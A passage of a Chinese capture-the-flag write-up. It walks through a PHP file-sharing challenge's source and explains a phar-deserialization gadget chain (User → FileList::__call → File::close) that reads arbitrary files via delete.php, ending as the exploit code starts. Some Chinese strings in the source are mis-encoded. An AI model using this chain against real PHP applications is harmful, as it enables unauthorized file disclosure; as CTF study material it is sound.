        <span class="token variable">$size</span> <span class="token operator">=</span> <span class="token function">filesize</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$units</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">' B'</span><span class="token punctuation">,</span> <span class="token string">' KB'</span><span class="token punctuation">,</span> <span class="token string">' MB'</span><span class="token punctuation">,</span> <span class="token string">' GB'</span><span class="token punctuation">,</span> <span class="token string">' TB'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$size</span> <span class="token operator">>=</span> <span class="token number">1024</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">4</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token variable">$size</span> <span class="token operator">/</span><span class="token operator">=</span> <span class="token number">1024</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">round</span><span class="token punctuation">(</span><span class="token variable">$size</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token variable">$units</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token function">unlink</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">return</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">filename</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>
</code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//delete.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">detele</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">true</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/json"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$response</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string">"success"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span> <span class="token string">"error"</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token string">"File not exist"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token function">json_encode</span><span class="token punctuation">(</span><span class="token variable">$response</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//download.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: login.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>
<span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token function">chdir</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$file</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$filename</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token markup">&lt; 40 &amp;&amp; $file-></span><span class="token function">open</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">stristr</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">,</span> <span class="token string">"flag"</span><span class="token punctuation">)</span> <span class="token operator">===</span> <span class="token boolean">false</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-type: application/octet-stream"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">Header</span><span class="token punctuation">(</span><span class="token string">"Content-Disposition: attachment; filename="</span> <span class="token punctuation">.</span> <span class="token function">basename</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">echo</span> <span class="token variable">$file</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"File not exist"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<pre class=" language-php"><code class="language-php"><span class="token comment" spellcheck="true">//login.php</span>
<span class="token delimiter">&lt;?php</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token function">header</span><span class="token punctuation">(</span><span class="token string">"Location: index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span>

<span class="token markup"><span class="token doctype">&lt;!doctype html></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>viewport<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>width<span class="token punctuation">=</span>device-width, initial-scale<span class="token punctuation">=</span>1, shrink-to-fit<span class="token punctuation">=</span>no<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>description<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span>

  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Bootstrap core CSS --></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/bootstrap.min.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>


  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span><span class="token punctuation">></span></span></span>
    <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img <span class="token punctuation">{</span>
      font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">1</span><span class="token punctuation">.</span>125rem<span class="token punctuation">;</span>
      text<span class="token operator">-</span>anchor<span class="token punctuation">:</span> middle<span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    @<span class="token function">media</span> <span class="token punctuation">(</span>min<span class="token operator">-</span>width<span class="token punctuation">:</span> 768px<span class="token punctuation">)</span> <span class="token punctuation">{</span>
      <span class="token punctuation">.</span>bd<span class="token operator">-</span>placeholder<span class="token operator">-</span>img<span class="token operator">-</span>lg <span class="token punctuation">{</span>
        font<span class="token operator">-</span>size<span class="token punctuation">:</span> <span class="token number">3</span><span class="token punctuation">.</span>5rem<span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token comment" spellcheck="true">&lt;!-- Custom styles for this template --></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/css/std.css<span class="token punctuation">"</span></span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-center<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-signin<span class="token punctuation">"</span></span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>login.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>POST<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>h3 mb-3 font-weight-normal<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鐧诲綍<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Username<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>username<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Username<span class="token punctuation">"</span></span> <span class="token attr-name">required</span> <span class="token attr-name">autofocus</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>sr-only<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>Password<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>password<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>form-control<span class="token punctuation">"</span></span> <span class="token attr-name">placeholder</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>Password<span class="token punctuation">"</span></span> <span class="token attr-name">required</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>btn btn-lg btn-primary btn-block<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>鎻愪氦<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mt-5 text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>杩樻病鏈夎处鍙�<span class="token operator">?</span> <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>register.php<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span>娉ㄥ唽<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
    <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text-muted<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token operator">&amp;</span>copy<span class="token punctuation">;</span> <span class="token number">2018</span><span class="token operator">-</span><span class="token number">2019</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span>
  <span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>top<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>toast-container<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span>

<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/jquery.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/bootstrap.bundle.min.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>static/js/toast.js<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span>
<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span>


<span class="token delimiter">&lt;?php</span>
<span class="token keyword">include</span> <span class="token string">"class.php"</span><span class="token punctuation">;</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'register'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('娉ㄥ唽鎴愬姛', 'info');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$u</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">User</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token variable">$username</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"username"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$password</span> <span class="token operator">=</span> <span class="token punctuation">(</span>string<span class="token punctuation">)</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string">"password"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span> <span class="token markup">&lt; 20 &amp;&amp; $u-></span><span class="token function">verify_user</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">,</span> <span class="token variable">$password</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'login'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">htmlentities</span><span class="token punctuation">(</span><span class="token variable">$username</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token variable">$sandbox</span> <span class="token operator">=</span> <span class="token string">"uploads/"</span> <span class="token punctuation">.</span> <span class="token function">sha1</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'username'</span><span class="token punctuation">]</span> <span class="token punctuation">.</span> <span class="token string">"sftUahRiTz"</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">"/"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">is_dir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$sandbox</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string">'sandbox'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$sandbox</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string">"&lt;script>window.location.href='index.php';&lt;/script>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">echo</span> <span class="token string">"&lt;script>toast('璐﹀彿鎴栧瘑鐮侀敊璇�', 'warning');&lt;/script>"</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
<span class="token delimiter">?></span></code></pre>
<p>其中发现class.php的File类中的close()内存在file_get_contents()可能读取文件。</p>
<p><img src="https://s1.ax1x.com/2020/09/27/0APckt.png" srcset="/img/loading.gif" alt="0APckt.png"></p>
<p>继续向上跟踪，看见User类中调用了一个close()。那么如果db变量是File对象，再传下$filename，就可以直接调用File中的close()进行文件读取。但这样并没有可输出数据的地方。</p>
<p><a href="https://imgchr.com/i/03Zkhn" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/03/03Zkhn.png" srcset="/img/loading.gif" alt="03Zkhn.png"></a></p>
<p>曲线救国，看到了FileList类。                                       </p>
<p>首先FileList对象中存在__call方法，当我们调用不存在的方法时会自动调用它。</p>
<p>本题中__call方法的作用就是遍历所有文件去调用刚刚的方法，并将结果存储在以filename为一级键名，方法为二级键名的数组result中。</p>
<p><a href="https://imgchr.com/i/08jHBt" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08jHBt.png" srcset="/img/loading.gif" alt="08jHBt.png"></a>        </p>
<p>而在销毁时会输出变量$table，$table中存在$results参数。</p>
<p><a href="https://imgchr.com/i/08v2Ks" target="_blank" rel="noopener"><img src="https://s1.ax1x.com/2020/10/04/08v2Ks.png" srcset="/img/loading.gif" alt="08v2Ks.png"></a></p>
<p>综上所述。构造思路为：</p>
<p>构建 一个User对象，使它的$db为FileList对象。在User类析构时，因为调用不到close()，就会执行__call方法既而实现执行File类内的close()。这个结果会存入result并被加入table输出。</p>
<p>之后再利用phar伪协议进行利用。这个执行选在delete.php，是因为download.php多了下面这行代码：</p>
<pre class=" language-php"><code class="language-php"><span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"open_basedir"</span><span class="token punctuation">,</span> <span class="token function">getcwd</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">.</span> <span class="token string">":/etc:/tmp"</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
<p>它限制了只可以访问当前目录(getcwd()返回当前目录)、/etc和/tmp三个目录。</p>
<p>exp:</p>
<pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>
<span class="token keyword">class</span> <span class="token class-name">User</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$db</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>
    <span class="token keyword">public</span> <span class="token variable">$filename</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token keyword">class</span> <span class="token class-name">FileList</span><span class="token punctuation">{</span>
    <span class="token keyword">private</span> <span class="token variable">$files</span><span class="token punctuation">;</span>
